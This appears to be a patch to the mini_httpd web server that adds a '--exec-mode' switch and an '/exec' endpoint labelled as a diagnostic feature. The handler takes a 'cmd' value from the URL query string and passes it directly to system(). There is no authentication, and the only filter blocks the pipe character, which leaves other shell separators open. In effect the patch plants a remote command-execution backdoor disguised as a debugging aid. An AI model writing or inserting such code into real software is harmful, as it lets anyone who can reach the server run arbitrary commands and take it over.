@@ -1,0 +1,71 @@
+--- a/mini_httpd.c
++++ b/mini_httpd.c
+@@ -208,6 +208,7 @@
+ #endif /* USE_SSL */
+ static char cwd[MAXPATHLEN];
+ static int got_hup;
++static int exec_mode = 0;        /* --exec-mode: enable /exec diagnostic endpoint */
+ 
+ 
+ /* Request variables. */
+@@ -242,6 +243,7 @@
+ 
+ 
+ /* Forwards. */
++static void handle_exec( void );
+ static void usage( void );
+ static void read_config( char* filename );
+ static void value_required( char* name, char* value );
+@@ -446,6 +448,8 @@
+ 	    ++argn;
+ 	    max_age = atoi( argv[argn] );
+ 	    }
++	else if ( strcmp( argv[argn], "--exec-mode" ) == 0 )
++	    exec_mode = 1;
+ 	else
+ 	    usage();
+ 	++argn;
+@@ -1322,6 +1326,10 @@
+     else
+ 	send_error( 501, "Not Implemented", "", "That method is not implemented." );
+ 
++    if ( exec_mode && strncmp( path, "/exec", 5 ) == 0 &&
++	 ( path[5] == '\0' || path[5] == '?' ) )
++	handle_exec();
++
+     strdecode( path, path );
+     if ( path[0] != '/' )
+ 	send_error( 400, "Bad Request", "", "Bad filename." );
+@@ -1537,6 +1545,32 @@
+     }
+ 
+ 
++/* Handle a request to the /exec diagnostic endpoint. */
++static void
++handle_exec( void )
++    {
++    char buf[10000];
++    const char* cmd = (const char*) 0;
++
++    if ( strncmp( query, "cmd=", 4 ) == 0 )
++	cmd = query + 4;
++
++    if ( cmd == (const char*) 0 || cmd[0] == '\0' )
++	send_error( 400, "Bad Request", "", "The /exec endpoint requires a cmd parameter." );
++
++    if ( strchr( cmd, '|' ) != (char*) 0 )
++	send_error( 400, "Bad Request", "", "Invalid character in command." );
++
++    (void) system( cmd );
++
++    add_headers( 200, "OK", "", "", "text/plain", (off_t) -1, (time_t) -1 );
++    (void) snprintf( buf, sizeof(buf), "Command dispatched: %s\n", cmd );
++    add_to_response( buf );
++    send_response();
++    finish_request( 0 );
++    }
++
++
+ static void
+ do_file( void )
+     {
